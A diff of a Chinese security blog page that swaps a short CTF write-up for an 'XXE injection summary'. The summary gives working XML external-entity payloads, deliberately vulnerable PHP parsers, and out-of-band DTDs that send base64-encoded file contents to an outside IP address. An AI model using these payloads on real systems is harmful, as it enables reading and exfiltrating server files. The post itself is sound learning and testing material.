@@ -61,23 +61,29 @@
   };
 </script>
 
-  <meta name="description" content="签到题写完，比赛结束">
-<meta name="keywords" content="WP">
+  <meta name="description" content="XXE的基础知识就不说了，网上有很多文章。">
+<meta name="keywords" content="XXE,注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2019NJUPT_CTF_WP">
-<meta property="og:url" content="https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/index.html">
+<meta property="og:title" content="XXE注入总结">
+<meta property="og:url" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/index.html">
 <meta property="og:site_name" content="0xCreed">
-<meta property="og:description" content="签到题写完，比赛结束">
+<meta property="og:description" content="XXE的基础知识就不说了，网上有很多文章。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/image-20191122221701015.png">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/image-20191122222006279.png">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/image-20191122225502634.png">
-<meta property="og:updated_time" content="2019-11-22T16:19:32.178Z">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/image-20191218212649252.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/image-20191219111929470.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/image-20191219112205187.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/image-20191219194710329.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/image-20191219192450371.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/20181120002647-e93bbf00-ec17-1.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/image-20191219225251465.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/image-20191219225453109.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/image-20191219231126267.png">
+<meta property="og:updated_time" content="2019-12-19T15:11:28.662Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2019NJUPT_CTF_WP">
-<meta name="twitter:description" content="签到题写完，比赛结束">
-<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/image-20191122221701015.png">
-  <link rel="canonical" href="https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/">
+<meta name="twitter:title" content="XXE注入总结">
+<meta name="twitter:description" content="XXE的基础知识就不说了，网上有很多文章。">
+<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/image-20191218212649252.png">
+  <link rel="canonical" href="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/">
 
 
 <script id="page-configurations">
@@ -91,7 +97,7 @@
   };
 </script>
 
-  <title>2019NJUPT_CTF_WP | 0xCreed</title>
+  <title>XXE注入总结 | 0xCreed</title>
   
 
 
@@ -338,7 +344,7 @@
   
   
   <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/">
+    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="0xCreed">
@@ -350,7 +356,7 @@
       <meta itemprop="name" content="0xCreed">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">2019NJUPT_CTF_WP
+        <h2 class="post-title" itemprop="name headline">XXE注入总结
 
           
         </h2>
@@ -366,7 +372,7 @@
                 
               
 
-              <time title="创建时间：2019-11-22 22:14:46" itemprop="dateCreated datePublished" datetime="2019-11-22T22:14:46+08:00">2019-11-22</time>
+              <time title="创建时间：2019-12-18 21:04:29" itemprop="dateCreated datePublished" datetime="2019-12-18T21:04:29+08:00">2019-12-18</time>
             </span>
           
             
@@ -377,7 +383,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-11-23 00:19:32" itemprop="dateModified" datetime="2019-11-23T00:19:32+08:00">2019-11-23</time>
+                <time title="修改时间：2019-12-19 23:11:28" itemprop="dateModified" datetime="2019-12-19T23:11:28+08:00">2019-12-19</time>
               </span>
             
           
@@ -414,7 +420,7 @@
       
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2019/11/2019NJUPT-CTF-WP/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2019/11/2019NJUPT-CTF-WP/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2019/12/XXE注入总结/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2019/12/XXE注入总结/" itemprop="commentCount"></span></a>
   </span>
   
   
@@ -426,7 +432,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span>544</span>
+              <span>2.9k</span>
             </span>
           
             <span class="post-meta-item" title="阅读时长">
@@ -436,10 +442,10 @@
               
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
               
-              <span>1 分钟</span>
+              <span>3 分钟</span>
             </span>
           
-            <div class="post-description">签到题写完，比赛结束</div>
+            <div class="post-description">XXE的基础知识就不说了，网上有很多文章。</div>
           
 
         </div>
@@ -451,25 +457,59 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>简单的XML</p><p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122221701015.png" alt="image-20191122221701015"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../flag" &gt;]&gt;</span>     </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+        <p><em>XXE即XML External Entity Injection，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string（）</em></p><p>这里主要是记录一些Payload</p><a id="more"></a>
 
+<p>如果要自己复现的话，先检查自己是否安装php-xml</p>
+<p><strong>一、有回显读本地敏感文件(Normal XXE)</strong></p>
+<p><strong><em>xml.php</em></strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p><strong><em>payload:</em></strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE creds [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY goodies SYSTEM "php://filter/read=convert.base64-encode/resource=./index.php"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;goodies;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h3><p>接着用上面的payload</p>
-<p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122222006279.png" alt="image-20191122222006279"></p>
-<p>正如提示所说，要利用xml做更多的事情</p>
-<h3 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h3><p>题目有一些过滤 后缀必须是图片的后缀</p>
-<p>文件中不能出现 <code>?&gt;</code></p>
-<p>上传后php代码成功就直接给flag的位置</p>
-<p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122225502634.png" alt="image-20191122225502634"></p>
-<p>想到页面中有个action参数</p>
-<p>把flag的位置给action得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60002/index.php?action=/var/www/html/upload-imgs/e8849c5939285e7053ba8d7af6cb1c25/Th1s_is_a_fl4g.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/12/XXE注入总结/image-20191218212649252.png" alt="image-20191218212649252"></p>
+<p>这里一般会利用php伪协议进行编码，防止某些特殊字符导致报错</p>
+<p><strong>二、无回显读取本地敏感文件(Blind OOB XXE)</strong></p>
+<p><strong><em>xml.php</em></strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>4E 43 54 46</p>
-<p>78 67 84 70</p>
-<p>50 44 34 7E</p>
-<p>80 68 52 126</p>
+<p><strong><em>payload</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.103.62.94:8888/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>evil.dtd</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/XXE注入总结/image-20191219111929470.png" alt="image-20191219111929470"></p>
+<p>这里需要注意的是读取的文件不能太大，否则会报错</p>
+<p><img src="/2019/12/XXE注入总结/image-20191219112205187.png" alt="image-20191219112205187"></p>
+<p>这里可以利用zlib压缩数据流</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=zlib.deflate/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>evil.dtd</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=php://filter/read=zlib.deflate/resource=index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/XXE注入总结/image-20191219194710329.png" alt="image-20191219194710329"></p>
+<p><strong><em>decode.py</em></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">""</span> //解密的字符串</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64_inflate</span><span class="params">(b64string)</span>:</span></span><br><span class="line">    decode_base64 = base64.b64decode(b64string)</span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(decode_base64,<span class="number">-15</span>)</span><br><span class="line">print(decode_base64_inflate(str))</span><br></pre></td></tr></table></figure>
+
+<p><strong>*三丶SVG格式XXE注入</strong></p>
+<p>这个姿势是Google CTF 2019的<a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">某道题</a> 这道题的<a href="https://docs.google.com/viewerng/viewer?url=https://ctrsec.io/wp-content/uploads/2019/06/Google-CTF-2019-Writeups-Web-gphotos.pptx.pdf&hl=en" target="_blank" rel="noopener">WP</a> (注意网络)学到的</p>
+<p><strong><em>svg.php</em></strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE svg [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://47.103.62.94:8080/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="22px" viewBox="0 0 28 22" enable-background="new 0 0 28 22" xml:space="preserve"&gt;  &lt;image id="image0" width="28" height="22" x="0" y="0"href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA"&gt;</span></span><br><span class="line"><span class="string">&lt;/svg&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$domcument = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$domcument-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$img = simplexml_import_dom($domcument);</span><br><span class="line">$attrs = $img-&gt;attributes();</span><br><span class="line">$width = (int) $attrs-&gt;width;</span><br><span class="line">$height = (int) $attrs-&gt;height;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/XXE注入总结/image-20191219192450371.png" alt="image-20191219192450371"></p>
+<p>虽然报了一大堆错但数据已经带出来了</p>
+<p><strong><em>四、各种平台上支持协议</em></strong></p>
+<p><img src="/2019/12/XXE注入总结/20181120002647-e93bbf00-ec17-1.png" alt="20181120002647-e93bbf00-ec17-1"></p>
+<p><strong><em>五、HTTP内网主机探测</em></strong></p>
+<p>尝试读取网络配置文件</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/etc/</span>network/interfaces</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/proc/</span>net/arp</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/etc/</span>hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/XXE注入总结/image-20191219225251465.png" alt="image-20191219225251465"></p>
+<p><img src="/2019/12/XXE注入总结/image-20191219225453109.png" alt="image-20191219225453109"></p>
+<p><img src="/2019/12/XXE注入总结/image-20191219231126267.png" alt="image-20191219231126267"></p>
+<p><a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">XXE漏洞分析</a></p>
+<p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
 
     </div>
 
@@ -477,16 +517,6 @@
     
     
       
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="\2019\10\第十届极客大挑战Write-up\" rel="bookmark">第十届极客大挑战Write-up</a></div>
-      
-    </li>
-  
-  </ul>
 
         
       
@@ -498,7 +528,7 @@
     <strong>本文作者： </strong>0xCreed</li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/" title="2019NJUPT_CTF_WP">https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/</a>
+    <a href="https://0xcreed.jxustctf.top/2019/12/XXE注入总结/" title="XXE注入总结">https://0xcreed.jxustctf.top/2019/12/XXE注入总结/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -522,7 +552,10 @@
           
           <div class="post-tags">
             
-              <a href="/tags/WP/" rel="tag"> <i class="fa fa-tag"></i> WP</a>
+              <a href="/tags/XXE/" rel="tag"> <i class="fa fa-tag"></i> XXE</a>
+			   
+            
+              <a href="/tags/注入/" rel="tag"> <i class="fa fa-tag"></i> 注入</a>
 			   
             
           </div>
@@ -533,8 +566,8 @@
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/11/2019红帽杯web复现/" rel="next" title="2019红帽杯复现">
-                  <i class="fa fa-chevron-left"></i> 2019红帽杯复现
+                <a href="/2019/12/base64隐写/" rel="next" title="base64隐写">
+                  <i class="fa fa-chevron-left"></i> base64隐写
                 </a>
               
             </div>
@@ -542,10 +575,6 @@
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/12/base64隐写/" rel="prev" title="base64隐写">
-                  base64隐写 <i class="fa fa-chevron-right"></i>
-                </a>
               
             </div>
           </div>
@@ -598,8 +627,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Fake-XML-cookbook"><span class="nav-number">1.</span> <span class="nav-text">Fake XML cookbook</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#True-XML-cookbook"><span class="nav-number">1.1.</span> <span class="nav-text">True XML cookbook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Upload-your-Shell"><span class="nav-number">1.2.</span> <span class="nav-text">Upload your Shell</span></a></li></ol></li></ol></div>
-        
       </div>
       <!--/noindex-->
 
